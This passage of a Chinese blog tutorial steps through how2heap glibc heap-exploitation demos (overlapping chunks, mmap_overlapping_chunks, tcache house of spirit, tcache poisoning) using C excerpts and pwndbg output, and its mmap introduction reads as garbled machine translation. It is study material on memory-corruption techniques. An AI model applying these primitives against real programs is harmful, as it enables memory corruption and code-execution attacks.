(&#x27;22222222&#x27;)</span><br><span class="line">06:0030│      0x7fffffffe2b0 —▸ 0x555555559820 ◂— 0x3333333333333333 (&#x27;33333333&#x27;)</span><br><span class="line">07:0038│      0x7fffffffe2b8 —▸ 0x555555559320 ◂— 0x3232323232323232 (&#x27;22222222&#x27;)</span><br><span class="line">───────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">555555555390</span> main+<span class="number">359</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>fff7dec0b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; p p4+evil_region_size</span><br><span class="line">$<span class="number">9</span> = (<span class="keyword">long</span> *) <span class="number">0x55555555bee0</span></span><br><span class="line">pwndbg&gt; p p3+<span class="number">0x580</span><span class="number">-8</span></span><br><span class="line">$<span class="number">10</span> = (<span class="keyword">long</span> *) <span class="number">0x55555555c3e0</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>我们就会发现 p4 和 p3 重叠了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope p3</span><br><span class="line">00:0000│ rax rdi  0x555555559820 ◂— 0x3333333333333333 (&#x27;33333333&#x27;)</span><br><span class="line">... ↓</span><br><span class="line">pwndbg&gt; telescope p4</span><br><span class="line">00:0000│   0x555555559320 ◂— 0x3434343434343434 (&#x27;44444444&#x27;)</span><br><span class="line">... ↓</span><br><span class="line">pwndbg&gt; hexdump <span class="number">0x555555559320</span> <span class="number">0x400</span></span><br><span class="line">+<span class="number">0000</span> <span class="number">0x555555559320</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  │<span class="number">4444</span>│<span class="number">4444</span>│<span class="number">4444</span>│<span class="number">4444</span>│</span><br><span class="line">...</span><br><span class="line">pwndbg&gt;</span><br><span class="line">+<span class="number">0020</span> <span class="number">0x555555559720</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  │<span class="number">4444</span>│<span class="number">4444</span>│<span class="number">4444</span>│<span class="number">4444</span>│</span><br><span class="line">...</span><br><span class="line">+<span class="number">0120</span> <span class="number">0x555555559820</span>  <span class="number">33</span> <span class="number">33</span> <span class="number">33</span> <span class="number">33</span>  <span class="number">33</span> <span class="number">33</span> <span class="number">33</span> <span class="number">33</span>  <span class="number">33</span> <span class="number">33</span> <span class="number">33</span> <span class="number">33</span>  <span class="number">33</span> <span class="number">33</span> <span class="number">33</span> <span class="number">33</span>  │<span class="number">3333</span>│<span class="number">3333</span>│<span class="number">3333</span>│<span class="number">3333</span>│</span><br><span class="line">...</span><br><span class="line">+<span class="number">0170</span> <span class="number">0x555555559870</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  │<span class="number">4444</span>│<span class="number">4444</span>│<span class="number">4444</span>│<span class="number">4444</span>│</span><br><span class="line">...</span><br><span class="line">+<span class="number">0190</span> <span class="number">0x555555559890</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">71</span> <span class="number">07</span> <span class="number">02</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  │<span class="number">4444</span>│<span class="number">4444</span>│q...│....│</span><br><span class="line">+<span class="number">01</span>a0 <span class="number">0x5555555598a0</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  │....│....│....│....│</span><br><span class="line">...</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><h3 id="7-mmap-overlapping-chunks"><a href="#7-mmap-overlapping-chunks" class="headerlink" title="7. mmap_overlapping_chunks"></a>7. mmap_overlapping_chunks</h3><pre><code>    GLibC中的Mmap chunks入门知识    ==================================在GLibC中，有一个点，当一个分配是如此之大，以至于malloc决定我们需要一个单独的内存部分来处理它，而不是在正常的堆上分配它。这是由 mmap_threshold var.代替正常的获取块的逻辑，系统调用 Mmap。这将分配一段虚拟内存，并把它还给用户。同样，释放过程也会有所不同。释放的块不是还给一个bin或堆的其他部分，而是使用另一个syscall。*Munmap*. 它接收一个先前分配的Mmap块的指针，并将其释放回内核。Mmap chunks在大小元数据上有一个特殊的位：第二位。如果这个位被设置，那么这个块就被分配为一个Mmap块。Mmap分块有一个prev_size和一个size。大小*代表当前的 分块的大小。一个chunk的*prev_size*表示剩余的空间。的大小（不是直接低于大小的分块）。然而，fd和bk指针并没有被使用，因为Mmap chunks并没有返回到 的大小，就像GLibC Malloc中的大多数堆块一样。释放后， 分块必须是页面对齐的。下面的POC本质上是一个重叠的chunk攻击，但在mmap chunks上。这和https://github.com/shellphish/how2heap/blob/master/glibc_2.26/overlapping_chunks.c 非常相似。主要的区别是，mmapped chunks有特殊的属性，并且是 以不同的方式处理，创造出与正常情况下不同的攻击场景。重叠的分块攻击。还可以做其他的事情。如munmapping系统库、堆本身和其他东西。这只是一个简单的概念证明，目的是为了证明一般的 的方法来执行对 mmap 分块的攻击。 关于GLibC中mmap chunks的更多信息，请阅读这篇文章。http://tukan.farm/2016/07/27/munmap-madness/</code></pre><p>首先使用 malloc 分配几个大的 chunk :</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">57</span> <span class="keyword">long</span> <span class="keyword">long</span>* top_ptr = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">  <span class="number">58</span> <span class="built_in">printf</span>(<span class="string">&quot;The first mmap chunk goes directly above LibC: %p\n&quot;</span>,top_ptr);</span><br><span class="line">  <span class="number">59</span></span><br><span class="line">  <span class="number">60</span> <span class="comment">// After this, all chunks are allocated downwards in memory towards the heap.</span></span><br><span class="line">► <span class="number">61</span> <span class="keyword">long</span> <span class="keyword">long</span>* mmap_chunk_2 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">  <span class="number">62</span> <span class="built_in">printf</span>(<span class="string">&quot;The second mmap chunk goes below LibC: %p\n&quot;</span>, mmap_chunk_2);</span><br><span class="line">  <span class="number">63</span></span><br><span class="line">  <span class="number">64</span> <span class="keyword">long</span> <span class="keyword">long</span>* mmap_chunk_3 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">  <span class="number">65</span> <span class="built_in">printf</span>(<span class="string">&quot;The third mmap chunk goes below the second mmap chunk: %p\n&quot;</span>, mmap_chunk_3);</span><br></pre></td></tr></table></figure><p>此时我们可以知道 mmap_chunk_3 的 preve size 和 size 分别为： 0 和 0x101002</p><p>假设我们此时有一个漏洞可以修改 preve_size</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">88</span> <span class="comment">// Vulnerability!!! This could be triggered by an improper index or a buffer overflow from a chunk further below.</span></span><br><span class="line">  <span class="number">89</span> <span class="comment">// Additionally, this same attack can be used with the prev_size instead of the size.</span></span><br><span class="line">► <span class="number">90</span> mmap_chunk_3[<span class="number">-1</span>] = (<span class="number">0xFFFFFFFFFD</span> &amp; mmap_chunk_3[<span class="number">-1</span>]) + (<span class="number">0xFFFFFFFFFD</span> &amp; mmap_chunk_2[<span class="number">-1</span>]) | <span class="number">2</span>;</span><br><span class="line">  <span class="number">91</span> <span class="built_in">printf</span>(<span class="string">&quot;New size of third mmap chunk: 0x%llx\n&quot;</span>, mmap_chunk_3[<span class="number">-1</span>]);</span><br><span class="line">  <span class="number">92</span> <span class="built_in">printf</span>(<span class="string">&quot;Free the third mmap chunk, which munmaps the second and third chunks\n\n&quot;</span>);</span><br><span class="line">  <span class="number">93</span></span><br><span class="line">  <span class="number">94</span> <span class="comment">/*</span></span><br></pre></td></tr></table></figure><p>我们将 prev_size 修改为 0x202002 , 然后我们 free mmap_chunk_3 , </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">102</span> Because of <span class="keyword">this</span> added restriction, the main goal is to get the memory back from the system</span><br><span class="line">  <span class="number">103</span> to have two pointers assigned to the same location.</span><br><span class="line">  <span class="number">104</span> */</span><br><span class="line">  <span class="number">105</span> <span class="comment">// Munmaps both the second and third pointers</span></span><br><span class="line">► <span class="number">106</span> <span class="built_in">free</span>(mmap_chunk_3);</span><br><span class="line">  <span class="number">107</span></span><br><span class="line">  <span class="number">108</span> <span class="comment">/*</span></span><br><span class="line"><span class="comment">  109 Would crash, if on the following:</span></span><br><span class="line"><span class="comment">  110 mmap_chunk_2[0] = 0xdeadbeef;</span></span><br><span class="line"><span class="comment">  111 This is because the memory would not be allocated to the current program.</span></span><br></pre></td></tr></table></figure><p>这个时候我们再 malloc 一个大小 0x300000 ， 由于前面发生的合并，所以我们会得到一个 重叠的 chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">120</span> <span class="built_in">printf</span>(<span class="string">&quot;Get a very large chunk from malloc to get mmapped chunk\n&quot;</span>);</span><br><span class="line">   <span class="number">121</span> <span class="built_in">printf</span>(<span class="string">&quot;This should overlap over the previously munmapped/freed chunks\n&quot;</span>);</span><br><span class="line">   <span class="number">122</span> <span class="keyword">long</span> <span class="keyword">long</span>* overlapping_chunk = <span class="built_in">malloc</span>(<span class="number">0x300000</span>);</span><br><span class="line"> ► <span class="number">123</span> <span class="built_in">printf</span>(<span class="string">&quot;Overlapped chunk Ptr: %p\n&quot;</span>, overlapping_chunk);</span><br><span class="line">   <span class="number">124</span> <span class="built_in">printf</span>(<span class="string">&quot;Overlapped chunk Ptr Size: 0x%llx\n&quot;</span>, overlapping_chunk[<span class="number">-1</span>]);</span><br><span class="line">   <span class="number">125</span></span><br><span class="line">     ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">     pwndbg&gt; p overlapping_chunk</span><br><span class="line">$<span class="number">7</span> = (<span class="keyword">long</span> <span class="keyword">long</span> *) <span class="number">0x7f78b3e60010</span></span><br><span class="line">pwndbg&gt; p/x overlapping_chunk[<span class="number">-1</span>]</span><br><span class="line">$<span class="number">8</span> = <span class="number">0x301002</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>然后我们修改 overlapping_chunk 的数据内容的同时，就是把 mmap_chunk_2 的值修改了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">135</span> <span class="comment">// Show that the pointer has been written to.</span></span><br><span class="line"> ► <span class="number">136</span> <span class="built_in">printf</span>(<span class="string">&quot;Second chunk value (after write): 0x%llx\n&quot;</span>, mmap_chunk_2[<span class="number">0</span>]);</span><br><span class="line">   <span class="number">137</span> <span class="built_in">printf</span>(<span class="string">&quot;Overlapped chunk value: 0x%llx\n\n&quot;</span>, overlapping_chunk[distance]);</span><br><span class="line">   <span class="number">138</span> <span class="built_in">printf</span>(<span class="string">&quot;Boom! The new chunk has been overlapped with a previous mmaped chunk\n&quot;</span>);</span><br><span class="line">───────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; p/x mmap_chunk_2[<span class="number">0</span>]</span><br><span class="line">$<span class="number">14</span> = <span class="number">0x1122334455667788</span></span><br></pre></td></tr></table></figure><h3 id="8-tcache-house-of-spirit"><a href="#8-tcache-house-of-spirit" class="headerlink" title="8. tcache_house_of_spirit"></a>8. tcache_house_of_spirit</h3><p>首先 malloc 一个 chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">12</span> <span class="built_in">printf</span>(<span class="string">&quot;(Search for strings \&quot;invalid next size\&quot; and \&quot;double free or corruption\&quot;)\n\n&quot;</span>);</span><br><span class="line">  <span class="number">13</span></span><br><span class="line">  <span class="number">14</span> <span class="built_in">printf</span>(<span class="string">&quot;Ok. Let&#x27;s start with the example!.\n\n&quot;</span>);</span><br><span class="line">  <span class="number">15</span></span><br><span class="line">  <span class="number">16</span></span><br><span class="line">► <span class="number">17</span> <span class="built_in">printf</span>(<span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line">  <span class="number">18</span> <span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="number">19</span></span><br><span class="line">  <span class="number">20</span> <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.\n&quot;</span>);</span><br></pre></td></tr></table></figure><p>此时在栈上我们有一个可控目标</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">20</span> <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.\n&quot;</span>);</span><br><span class="line"><span class="number">21</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line"><span class="number">22</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region</span></span><br></pre></td></tr></table></figure><p>将这个可控目标伪造成一个一个chunk ，修改其大小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">28</span> fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br></pre></td></tr></table></figure><p>free 这个伪造的 chunk ，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">34</span> a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line">  <span class="number">35</span></span><br><span class="line">  <span class="number">36</span> <span class="built_in">printf</span>(<span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line">  <span class="number">37</span> <span class="built_in">free</span>(a);</span><br><span class="line">  <span class="number">38</span></span><br></pre></td></tr></table></figure><p>我们就会发现，在 tcache 上有一个栈地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x40</span> [  <span class="number">1</span>]: <span class="number">0x7ffe02d9aa00</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>此时，我们再malloc 一次，就能把这个栈地址拿回来</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────</span><br><span class="line">In file: /pwn/tcache_house_of_spirit.c</span><br><span class="line">   <span class="number">38</span></span><br><span class="line">   <span class="number">39</span> <span class="built_in">printf</span>(<span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">   <span class="number">40</span> <span class="keyword">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">   <span class="number">41</span> <span class="built_in">printf</span>(<span class="string">&quot;malloc(0x30): %p\n&quot;</span>, b);</span><br><span class="line">   <span class="number">42</span></span><br><span class="line"> ► <span class="number">43</span> assert((<span class="keyword">long</span>)b == (<span class="keyword">long</span>)&amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">   <span class="number">44</span> &#125;</span><br><span class="line">─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7ffe02d9a9e0</span> —▸ <span class="number">0x7ffe02d9aa00</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7ffe02d9a9f0</span> —▸ <span class="number">0x55c7abd8f040</span> ◂— <span class="number">0x400000006</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7ffe02d9a9f8</span> ◂— <span class="number">0x40</span> <span class="comment">/* &#x27;@&#x27; */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7ffe02d9aa00</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7ffe02d9aa10</span> —▸ <span class="number">0x7ffe02d9aa36</span> ◂— <span class="number">0x55c7abd901200000</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7ffe02d9aa18</span> —▸ <span class="number">0x55c7abd9040d</span> (__libc_csu_init+<span class="number">77</span>) ◂— add    rbx, <span class="number">1</span></span><br><span class="line">───────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">55</span>c7abd90368 main+<span class="number">351</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>432c2890b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; p b</span><br><span class="line">$<span class="number">1</span> = (<span class="keyword">void</span> *) <span class="number">0x7ffe02d9aa00</span></span><br></pre></td></tr></table></figure><h3 id="9-tcache-poisoning"><a href="#9-tcache-poisoning" class="headerlink" title="9. tcache_poisoning"></a>9. tcache_poisoning</h3><p>通过劫持修改  tcache fd 的形式来，来获取一个目标地址,  这里的目标是一个栈地址， 作用于 8 挺相似的</p><p>malloc 两个 chunk ，分别为 a 和 b</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">21</span> <span class="built_in">printf</span>(<span class="string">&quot;Allocating 2 buffers.\n&quot;</span>);</span><br><span class="line">  <span class="number">22</span> <span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">  <span class="number">23</span> <span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, a);</span><br><span class="line">  <span class="number">24</span> <span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">► <span class="number">25</span> <span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, b);</span><br></pre></td></tr></table></figure><p>然后再一次将他们 free</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">27</span> <span class="built_in">printf</span>(<span class="string">&quot;Freeing the buffers...\n&quot;</span>);</span><br><span class="line">   <span class="number">28</span> <span class="built_in">free</span>(a);</span><br><span class="line">   <span class="number">29</span> <span class="built_in">free</span>(b);</span><br><span class="line">   <span class="number">30</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">2</span>]: <span class="number">0x55ce97ce6330</span> —▸ <span class="number">0x55ce97ce62a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>就有如上的链表结构，假设我们可以溢出第一个 chunk，那么们就能修改第二个 chunk 的fd ,则我们将 chunk b 的fd 修改为栈地址,此时 tcachebins 就变成如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">In file: /pwn/tcache_poisoning.c</span><br><span class="line">   <span class="number">30</span></span><br><span class="line">   <span class="number">31</span> <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, a);</span><br><span class="line">   <span class="number">32</span> <span class="built_in">printf</span>(<span class="string">&quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;</span></span><br><span class="line">   <span class="number">33</span>    <span class="string">&quot;to point to the location to control (%p).\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>), b, &amp;stack_var);</span><br><span class="line">   <span class="number">34</span> b[<span class="number">0</span>] = (<span class="keyword">intptr_t</span>)&amp;stack_var;</span><br><span class="line"> ► <span class="number">35</span> <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, &amp;stack_var);</span><br><span class="line">   <span class="number">36</span></span><br><span class="line">   <span class="number">37</span> <span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">   <span class="number">38</span> <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line">   <span class="number">39</span></span><br><span class="line">   <span class="number">40</span> <span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fff96c64620</span> —▸ <span class="number">0x7f5ea82fbfc8</span> (__exit_funcs_lock) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│ rdx  <span class="number">0x7fff96c64628</span> —▸ <span class="number">0x55ce96f65410</span> (__libc_csu_init) ◂— endbr64</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fff96c64630</span> —▸ <span class="number">0x55ce97ce62a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fff96c64638</span> —▸ <span class="number">0x55ce97ce6330</span> —▸ <span class="number">0x7fff96c64628</span> —▸ <span class="number">0x55ce96f65410</span> (__libc_csu_init) ◂— endbr64</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7fff96c64640</span> —▸ <span class="number">0x7fff96c64740</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│      <span class="number">0x7fff96c64648</span> ◂— <span class="number">0x6690dce44b0a5500</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│ rbp  <span class="number">0x7fff96c64650</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fff96c64658</span> —▸ <span class="number">0x7f5ea81320b3</span> (__libc_start_main+<span class="number">243</span>) ◂— mov    edi, eax</span><br><span class="line">───────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">55</span>ce96f65343 main+<span class="number">314</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>5ea81320b3 __libc_start_main+<span class="number">243</span></span><br><span 